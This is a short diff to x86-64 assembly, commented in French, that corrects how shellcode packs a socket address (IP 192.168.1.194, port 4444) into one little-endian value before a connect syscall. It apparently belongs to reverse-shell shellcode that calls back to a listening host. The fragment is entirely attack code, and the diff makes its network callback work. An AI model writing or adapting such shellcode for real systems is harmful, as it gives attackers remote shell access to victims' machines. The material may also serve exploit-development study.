@@ -14,14 +14,13 @@ syscall
 
 mov r12, rax    ; sauvegarde dans r12 pour eviter l'ecrasement des autres syscall 
 
-; sockaddr 
-xor rbx, rbx    ; remise a zero de rbx
-push rbx        ; padding de 8
-mov rbx, 0xc2a801c0      ; @ ip machine little indian
+; sockaddr_in : family(2) + port(4444) + ip + padding
+; en little-endian 64 bits : 02 00 5c 11 c0 a8 01 c2
+xor rbx, rbx
 push rbx
-mov rbx, 0x115c ; port 4444
+mov rbx, 0xc201a8c05c110002
 push rbx
-mov rsi,rsp     ; rsi = pointeur vers sockaddr
+mov rsi, rsp
 
 ;connect
 mov rax, 0x2a   ; syscall connect
